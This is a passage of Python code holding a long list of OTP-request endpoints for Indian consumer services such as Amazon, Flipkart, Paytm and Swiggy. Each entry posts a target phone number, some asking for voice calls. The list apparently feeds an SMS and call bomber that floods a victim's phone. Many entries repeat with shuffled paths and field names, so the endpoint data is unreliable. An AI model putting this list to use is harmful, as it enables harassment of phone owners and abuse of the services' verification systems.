    {'name': 'Blinkit WhatsApp', 'url': 'https://blinkit.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Ajio SMS', 'url': 'https://ajio.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Instamart SMS', 'url': 'https://instamart.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Zivame Call', 'url': 'https://zivame.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Cred SMS', 'url': 'https://cred.club/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Amazon Call', 'url': 'https://amazon.in/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Bigbasket Call', 'url': 'https://bigbasket.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Cred Call', 'url': 'https://cred.club/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Wakefit Call', 'url': 'https://wakefit.co/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': '1Mg WhatsApp', 'url': 'https://1mg.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Wakefit Call', 'url': 'https://wakefit.co/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Goibibo Call', 'url': 'https://goibibo.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Jupiter Call', 'url': 'https://jupiter.money/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Nykaa SMS', 'url': 'https://nykaa.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Bigbasket WhatsApp', 'url': 'https://bigbasket.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Oyorooms SMS', 'url': 'https://oyorooms.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Myntra Call', 'url': 'https://myntra.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Flipkart WhatsApp', 'url': 'https://flipkart.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Pharmeasy Call', 'url': 'https://pharmeasy.in/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Olacabs SMS', 'url': 'https://olacabs.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Swiggy SMS', 'url': 'https://swiggy.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Zepto WhatsApp', 'url': 'https://zepto.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Paytm SMS', 'url': 'https://paytm.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Wakefit WhatsApp', 'url': 'https://wakefit.co/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Makemytrip WhatsApp', 'url': 'https://makemytrip.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Zepto WhatsApp', 'url': 'https://zepto.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Makemytrip WhatsApp', 'url': 'https://makemytrip.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Amazon WhatsApp', 'url': 'https://amazon.in/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Ajio SMS', 'url': 'https://ajio.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Jupiter Call', 'url': 'https://jupiter.money/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Pharmeasy Call', 'url': 'https://pharmeasy.in/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Swiggy SMS', 'url': 'https://swiggy.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Zivame WhatsApp', 'url': 'https://zivame.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Flipkart WhatsApp', 'url': 'https://flipkart.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Shiprocket SMS', 'url': 'https://shiprocket.in/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Goibibo Call', 'url': 'https://goibibo.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Nykaa SMS', 'url': 'https://nykaa.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Ajio WhatsApp', 'url': 'https://ajio.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Wakefit WhatsApp', 'url': 'https://wakefit.co/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Dmart SMS', 'url': 'https://dmart.ready.in/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Khatabook SMS', 'url': 'https://khatabook.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Dmart SMS', 'url': 'https://dmart.ready.in/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Meesho Call', 'url': 'https://meesho.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Goibibo WhatsApp', 'url': 'https://goibibo.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Newme WhatsApp', 'url': 'https://newme.asia/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Flipkart SMS', 'url': 'https://flipkart.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': '1Mg Call', 'url': 'https://1mg.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Bigbasket SMS', 'url': 'https://bigbasket.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Zepto SMS', 'url': 'https://zepto.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Zepto SMS', 'url': 'https://zepto.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Flipkart SMS', 'url': 'https://flipkart.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Pharmeasy WhatsApp', 'url': 'https://pharmeasy.in/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Wakefit WhatsApp', 'url': 'https://wakefit.co/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Pokerbaazi SMS', 'url': 'https://pokerbaazi.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Meesho Call', 'url': 'https://meesho.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': '1Mg WhatsApp', 'url': 'https://1mg.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': '1Mg WhatsApp', 'url': 'https://1mg.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Tatacapital Call', 'url': 'https://tatacapital.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Pharmeasy Call', 'url': 'https://pharmeasy.in/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Blinkit SMS', 'url': 'https://blinkit.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Swiggy WhatsApp', 'url': 'https://swiggy.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Makemytrip SMS', 'url': 'https://makemytrip.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Jupiter WhatsApp', 'url': 'https://jupiter.money/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Jupiter WhatsApp', 'url': 'https://jupiter.money/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Zivame SMS', 'url': 'https://zivame.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Uber Call', 'url': 'https://uber.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Dmart WhatsApp', 'url': 'https://dmart.ready.in/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Olacabs WhatsApp', 'url': 'https://olacabs.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Paytm Call', 'url': 'https://paytm.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Goibibo WhatsApp', 'url': 'https://goibibo.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Oyorooms WhatsApp', 'url': 'https://oyorooms.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Zivame Call', 'url': 'https://zivame.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Pokerbaazi SMS', 'url': 'https://pokerbaazi.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Zomato SMS', 'url': 'https://zomato.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Blinkit WhatsApp', 'url': 'https://blinkit.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Zivame Call', 'url': 'https://zivame.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Shiprocket WhatsApp', 'url': 'https://shiprocket.in/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Olacabs WhatsApp', 'url': 'https://olacabs.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Dmart SMS', 'url': 'https://dmart.ready.in/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Zepto SMS', 'url': 'https://zepto.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Rapido SMS', 'url': 'https://rapido.bike/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Shiprocket Call', 'url': 'https://shiprocket.in/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': '1Mg Call', 'url': 'https://1mg.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Nykaa SMS', 'url': 'https://nykaa.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Phonepe SMS', 'url': 'https://phonepe.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Pharmeasy WhatsApp', 'url': 'https://pharmeasy.in/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Olacabs WhatsApp', 'url': 'https://olacabs.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Shiprocket Call', 'url': 'https://shiprocket.in/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Goibibo WhatsApp', 'url': 'https://goibibo.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Amazon Call', 'url': 'https://amazon.in/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Cred Call', 'url': 'https://cred.club/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': '1Mg SMS', 'url': 'https://1mg.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Dmart WhatsApp', 'url': 'https://dmart.ready.in/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Myntra SMS', 'url': 'https://myntra.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Bigbasket Call', 'url': 'https://bigbasket.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Amazon SMS', 'url': 'https://amazon.in/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Rapido WhatsApp', 'url': 'https://rapido.bike/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': '1Mg SMS', 'url': 'https://1mg.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Zepto SMS', 'url': 'https://zepto.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Pharmeasy WhatsApp', 'url': 'https://pharmeasy.in/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Amazon WhatsApp', 'url': 'https://amazon.in/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Rapido WhatsApp', 'url': 'https://rapido.bike/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Rapido Call', 'url': 'https://rapido.bike/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Paytm SMS', 'url': 'https://paytm.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Tatacapital WhatsApp', 'url': 'https://tatacapital.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Shiprocket Call', 'url': 'https://shiprocket.in/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Api-Gateway WhatsApp', 'url': 'https://api-gateway.juno.lenskart.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Goibibo WhatsApp', 'url': 'https://goibibo.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Jupiter Call', 'url': 'https://jupiter.money/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Oyorooms WhatsApp', 'url': 'https://oyorooms.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Oyorooms WhatsApp', 'url': 'https://oyorooms.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Nykaa WhatsApp', 'url': 'https://nykaa.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Bigbasket SMS', 'url': 'https://bigbasket.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Wakefit SMS', 'url': 'https://wakefit.co/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Myntra Call', 'url': 'https://myntra.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Blinkit WhatsApp', 'url': 'https://blinkit.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Gokwik WhatsApp', 'url': 'https://gokwik.co/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Goibibo WhatsApp', 'url': 'https://goibibo.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Uber SMS', 'url': 'https://uber.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Wakefit SMS', 'url': 'https://wakefit.co/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Newme SMS', 'url': 'https://newme.asia/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Phonepe WhatsApp', 'url': 'https://phonepe.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Zivame Call', 'url': 'https://zivame.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Khatabook WhatsApp', 'url': 'https://khatabook.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Paytm SMS', 'url': 'https://paytm.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Uber WhatsApp', 'url': 'https://uber.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Makemytrip SMS', 'url': 'https://makemytrip.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Flipkart WhatsApp', 'url': 'https://flipkart.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Makemytrip WhatsApp', 'url': 'https://makemytrip.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Zivame WhatsApp', 'url': 'https://zivame.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Myntra WhatsApp', 'url': 'https://myntra.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Blinkit WhatsApp', 'url': 'https://blinkit.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Phonepe WhatsApp', 'url': 'https://phonepe.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Rapido SMS', 'url': 'https://rapido.bike/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Flipkart WhatsApp', 'url': 'https://flipkart.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Meesho WhatsApp', 'url': 'https://meesho.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Bigbasket WhatsApp', 'url': 'https://bigbasket.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Zivame SMS', 'url': 'https://zivame.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Zomato SMS', 'url': 'https://zomato.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Nykaa Call', 'url': 'https://nykaa.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Rapido WhatsApp', 'url': 'https://rapido.bike/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Pharmeasy WhatsApp', 'url': 'https://pharmeasy.in/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Olacabs SMS', 'url': 'https://olacabs.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Rapido Call', 'url': 'https://rapido.bike/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Nykaa WhatsApp', 'url': 'https://nykaa.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': '1Mg Call', 'url': 'https://1mg.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Jupiter SMS', 'url': 'https://jupiter.money/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Amazon SMS', 'url': 'https://amazon.in/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
